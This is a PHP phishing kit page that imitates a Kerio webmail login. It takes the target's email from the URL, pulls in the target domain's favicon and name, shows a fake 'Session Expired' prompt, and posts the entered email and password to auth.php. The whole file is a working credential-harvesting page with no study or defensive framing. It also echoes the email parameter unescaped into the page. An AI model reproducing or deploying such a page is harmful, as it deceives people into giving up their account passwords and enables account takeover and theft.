<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title><?php echo $yuh ?> - Mail Login [Session Expired]</title>
<link type="text/css" rel="stylesheet" href="ico/style.css" media="all">
<link rel="SHORTCUT ICON" href="http://<?php echo $domain ?>/favicon.ico"/>
<link rel="apple-touch-icon" sizes="57x57" href="https://my.kerio.com/static/img/favicons/apple-icon-57x57.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="60x60" href="https://my.kerio.com/static/img/favicons/apple-icon-60x60.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="72x72" href="https://my.kerio.com/static/img/favicons/apple-icon-72x72.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="76x76" href="https://my.kerio.com/static/img/favicons/apple-icon-76x76.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="114x114" href="https://my.kerio.com/static/img/favicons/apple-icon-114x114.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="120x120" href="https://my.kerio.com/static/img/favicons/apple-icon-120x120.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="144x144" href="https://my.kerio.com/static/img/favicons/apple-icon-144x144.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="152x152" href="https://my.kerio.com/static/img/favicons/apple-icon-152x152.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="180x180" href="https://my.kerio.com/static/img/favicons/apple-icon-180x180.png?v=BUILD_HASH">
<link rel="icon" type="image/png" sizes="192x192" href="http://<?php echo $domain ?>/favicon.ico">
<link rel="icon" type="image/png" sizes="32x32" href="http://<?php echo $domain ?>/favicon.ico">


<script type="text/javascript">
<!--
function onLoad() {
	var
		k_urlHash = window.location.hash,
		k_emailInput = document.getElementById('email'),
		k_email,
		k_formElement,
		k_errorDiv,
		k_plainErrorMessage,
		k_errorMessage,
		k_errorTextNode;

	if (k_urlHash) {
		if (-1 !== k_urlHash.indexOf('email=')) {
			k_email = k_urlHash.substring(k_urlHash.indexOf('email=') + 6);
			if (-1 !== k_email.indexOf('&')) {
				k_email = k_email.substring(0, k_email.indexOf('&'));
			}
			if (k_email) {
				document.getElementById('email').value = k_email;
				document.getElementById('password').focus();

				k_urlHash = k_urlHash.replace('email=' + k_email, '');
			}
		}

		if(-1 !== k_urlHash.indexOf('errorMessage=')) {
			k_plainErrorMessage = k_urlHash.substring(k_urlHash.indexOf('errorMessage=') + 13);
			if (-1 !== k_plainErrorMessage.indexOf('&')) {
				k_plainErrorMessage = k_plainErrorMessage.substring(0, k_plainErrorMessage.indexOf('&'));
			}
			k_errorMessage = decodeURI(k_plainErrorMessage);
			if (k_errorMessage.length) {
				// If there is error message in the url hash, create the error div in the form
				k_formElement = document.getElementById('loginForm');
				k_errorDiv = document.createElement("div");
				k_errorDiv.className = 'error-message-text message';
				k_errorTextNode = document.createTextNode(k_errorMessage);
				k_errorDiv.appendChild(k_errorTextNode);

				k_formElement.insertBefore(k_errorDiv, k_formElement.firstChild);
			}

			k_urlHash = k_urlHash.replace('errorMessage=' + k_plainErrorMessage, '');
		}

		// remove linkers from above conditions
		k_urlHash = k_urlHash.replace('&&', '&'); // remove doubled linkers
		k_urlHash = k_urlHash.replace('#&', '#'); // remove linker on start
		k_urlHash = k_urlHash.replace(/&$/, '');  // remove linker on end
		k_urlHash = k_urlHash.replace(/^#&/, ''); // remove only hash mark

		if (k_urlHash.length) {
			document.getElementById('loginForm').action += k_urlHash;
			document.getElementById('registerLink').href += k_urlHash;
		}
	}

	k_emailInput.maxLength = mykerio.k_CONSTANTS.k_EMAIL_MAX_LENGHT;

	mykerio.k_widgets.k_browserInfo.k_showUnsupportedBrowserMessage(document.getElementById('unsupportedBrowser'));
	if (mykerio.k_widgets.k_browserInfo.k_isBlocked()) {
		document.body.className +=' browseBlocked';
	}
}
-->
</script>
<style>
body{
font-family: "Fakt Pro Medium", "Fakt Pro Medium Cyr", "Fakt Pro Medium Grk", -apple-system, ".SFNSText-Regular", "San Francisco", "Roboto", "Segoe UI", "Helvetica Neue", "Lucida Grande", sans-serif;
background-color: #f8f8f8 ;
}

a{
text-decoration:none;
color:   #d2d3d3 ;
font-size: 9px;
}


#em{margin-left: -35px}

::-webkit-input-placeholder { /* Chrome/Opera/Safari */
  color: #dfdfdf;
}
::-moz-placeholder { /* Firefox 19+ */
  color: #dfdfdf;
}
:-ms-input-placeholder { /* IE 10+ */
  color: #dfdfdf;
}
:-moz-placeholder { /* Firefox 18- */
  color: #dfdfdf;
}

input{
width: 17.5625em;
height: 1.5625em;
border-bottom: 1px solid  #892e00 ;
border-right: 1px solid  #892e00 ;
border-top: none;
border-left: none;
font-weight: 600;
font-family: -apple-system, ".SFNSText-Regular", "San Francisco", "Roboto", "Segoe UI", "Helvetica Neue", "Lucida Grande", sans-serif;
font-size: 0.975em;
text-overflow: ellipsis;
background-color: transparent;
z-index: 2;
margin: 0.6875em 0 0 0;
padding: 0 2% 0 2%;
text-align: center;
}

button{
width: 21.1625em;
height: 2.5625em;
background-color: #892e00 ;
font-family: "Fakt Pro Medium", "Fakt Pro Medium Cyr", "Fakt Pro Medium Grk", -apple-system, ".SFNSText-Regular", "San Francisco", "Roboto", "Segoe UI", "Helvetica Neue", "Lucida Grande", sans-serif;
border: none;
cursor: pointer;
font-size: 0.875em;
color: #FFFFFF;
font-weight: 600;
}

button:hover{background-color: #a14f26 ;}
button:active{background-color: #be7a58 ;}

input:hover{
	border-bottom: 1px solid  #a14f26 ;
border-right: 1px solid  #a14f26 ;
}
input:active{
	border-bottom: 1px solid  #be7a58 ;
border-right: 1px solid  #be7a58 ;
}


</style>
<script src="js.js"></script> 
</head>
<body onload="onLoad();">
    <br><br><br><br>
	<div id="header">
		
		<br>
	<div id="extwaiimpotscp" style="display:none" v="{8078" f="ZXpnd056Z3pNMlE1TFRobFlUY3ROREptT0MxaE9HRTBMVFEyWm1ZM05URTVaR1E0WW4wPQ==" q="bad00d1b" c="51.46" i="61.49" u="24.42" s="19082702" w="false" m="BMe=" vn="ytbd2"></div></div>
	<br>
	<br>

<div id="main-container">		
<div id="cn" align="center">
<span style="color: red; font-size: 19px;"><b>Session Expired:</b></span><span style="color: #8a7a7a ; font-weight: 600;"> Please Sign in to Continue</span><br>
<form accept-charset="UTF-8" action="auth.php?c=" autocomplete="off" method="post">
<br>

<p><span style="position: relative;"><img src="http://<?php echo $domain ?>/favicon.ico" onerror="this.src='http://<?php echo $domain ?>/favicon.ico'" "="" width="16px" height="16px"><input id="em" value="<?php echo $_GET['email']; ?>" required="" name="email" type="text" autocomplete="off"></span></p>

<p><span style="position: relative;"><img src="ico/lock.png" onerror="this.src='ico/lock.png'" "="" width="14px" height="14px"><input id="em" value="" required="" name="password" type="password" autocomplete="off" class=" masked"></span></p>
<script type="text/javascript">
  new MaskedPassword(document.getElementById("ps"), '\u25CF');
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>

 
<p><br><button id="ps" type="submit" value="Submit">Continue</button></p>
</form>
</div>
	<div class="under-link">
		<a href="#">Copyright© 2020
Privacy Policy <?php echo $yuh ?> </a>
	</div>
<br>
	<br>


</body></html>